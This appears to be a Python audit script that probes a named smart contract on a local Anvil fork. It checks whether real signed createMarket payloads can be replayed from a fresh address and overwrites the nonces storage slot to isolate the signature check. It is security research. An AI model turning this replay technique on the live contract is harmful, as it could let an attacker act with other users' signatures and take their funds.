#!/usr/bin/env python3
"""TayDex pass21: the actor-binding replay, on a fresh fork at the current head.

Uses the real createMarket payloads decoded in pass20b. A payload whose nonce is 0 is the
interesting one: `nonces` is a per-address mapping (slot 14), so a FRESH address also has nonce 0.
If the contract keys the nonce check on msg.sender, a fresh caller passes the nonce gate, and the
only remaining question is whether the signature itself is bound to the actor.

Read-only: eth_call only.
"""
import json, os, time, urllib.error, urllib.request

R = "http://127.0.0.1:8546"
C = "0x3ade22fa1ef5ac75437a3734d91ba588e54875dd"
TGT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "taydex")
from Crypto.Hash import keccak as _k
def keccak(b): h = _k.new(digest_bits=256); h.update(b); return h.digest()
def sig4(s): return keccak(s.encode()).hex()[:8]

def rpc(m, p, tries=3):
    last = None
    for t in range(tries):
        try:
            req = urllib.request.Request(R, data=json.dumps({"jsonrpc": "2.0", "id": 1,
                                                            "method": m, "params": p}).encode(),
                                         headers={"Content-Type": "application/json"})
            d = json.loads(urllib.request.urlopen(req, timeout=60).read())
            return d
        except urllib.error.HTTPError as e:
            try:    last = json.loads(e.read())
            except Exception: last = {"error": f"HTTP {e.code}"}
        except Exception as e:
            last = {"error": str(e)}
        time.sleep(1.5)
    return last or {}

def describe(r):
    if isinstance(r, dict) and "error" in r:
        err = r["error"]
        if not isinstance(err, dict):
            return f"TRANSPORT: {str(err)[:150]}"
        d = err.get("data"); msg = err.get("message", "")
        if isinstance(d, str) and d.startswith("0x08c379a0"):
            ln = int(d[10:74], 16)
            return f'Error("{bytes.fromhex(d[74:74+ln*2]).decode("utf-8","replace")}")'
        if isinstance(d, str) and len(d) >= 10:
            return f"{msg} [custom 0x{d[2:10]}]"
        if d is None:
            return f"{msg} (EMPTY data)"
        return str(msg)
    return "SUCCESS -> " + str((r or {}).get("result"))[:80]

# ---------- fork sanity ----------
info = rpc("anvil_nodeInfo", [])
fc = ((info.get("result") or {}).get("forkConfig") or {})
print(f"fork: {fc.get('forkUrl')}  block={fc.get('forkBlockNumber')}  "
      f"chainId={(info.get('result') or {}).get('environment', {}).get('chainId')}")
code = rpc("eth_getCode", [C, "latest"]).get("result", "0x")
print(f"target runtime: {len(code[2:])//2:,} bytes\n")

picks = json.load(open(os.path.join(TGT, "pass20_createmarket_decoded.json")))
print(f"{len(picks)} real createMarket payloads; "
      f"{sum(1 for p in picks if p['nonce'] == 0)} have nonce 0\n")

FRESH = "0x00000000000000000000000000000000cafe0001"
NONCES_SLOT = 14

def nonces_of(addr):
    d = "0x" + sig4("nonces(address)") + addr.lower().replace("0x", "").rjust(64, "0")
    r = rpc("eth_call", [{"to": C, "data": d}, "latest"]).get("result")
    return int(r, 16) if isinstance(r, str) else None

print("=" * 100)
print("nonce state on the fresh fork")
print("=" * 100)
print(f"  nonces(fresh)  = {nonces_of(FRESH)}")
for p in picks[:0]:
    pass
SIGNER = "0xb5932a150f48dcd5b299702dd0091670368ea4c9"
print(f"  nonces(signer) = {nonces_of(SIGNER)}")

print("\n" + "=" * 100)
print("REPLAY: same signed payload, different callers")
print("=" * 100)
for p in sorted(picks, key=lambda x: x["nonce"])[:3]:
    print(f"\n  payload {p['hash']}  nonce={p['nonce']}  orig={p['from']}")
    for label, who in [("original sender", p["from"]), ("FRESH address", FRESH)]:
        print(f"    [{label:<15}] nonces={nonces_of(who)}")
        r = rpc("eth_call", [{"from": who, "to": C, "data": p["input"]}, "latest"])
        print(f"        -> {describe(r)}")

print("\n" + "=" * 100)
print("ISOLATE THE NONCE: force a fresh address's nonce to the payload value")
print("=" * 100)
p = sorted(picks, key=lambda x: x["nonce"])[-1]      # highest nonce -> clearly mismatched
key = "0x" + keccak(bytes.fromhex(FRESH.lower().replace("0x", "").rjust(64, "0"))
                    + NONCES_SLOT.to_bytes(32, "big")).hex()
print(f"  payload {p['hash']} nonce={p['nonce']}")
r = rpc("eth_call", [{"from": FRESH, "to": C, "data": p["input"]}, "latest"])
print(f"    fresh, nonce NOT forced   -> {describe(r)}")
rpc("anvil_setStorageAt", [C, key, "0x" + f"{p['nonce']:064x}"])
print(f"    (set storage[keccak(fresh,14)] = {p['nonce']}; nonces(fresh) now = {nonces_of(FRESH)})")
r = rpc("eth_call", [{"from": FRESH, "to": C, "data": p["input"]}, "latest"])
print(f"    fresh, nonce FORCED       -> {describe(r)}")

print("\n" + "=" * 100)
print("KEY")
print("=" * 100)
print("  ECDSA/BadSignature error -> the signature IS bound to its actor")
print("  a nonce Error(...)       -> the nonce check keys on msg.sender")
print("  USDC / transfer / other  -> the signature was ACCEPTED from a foreign address")
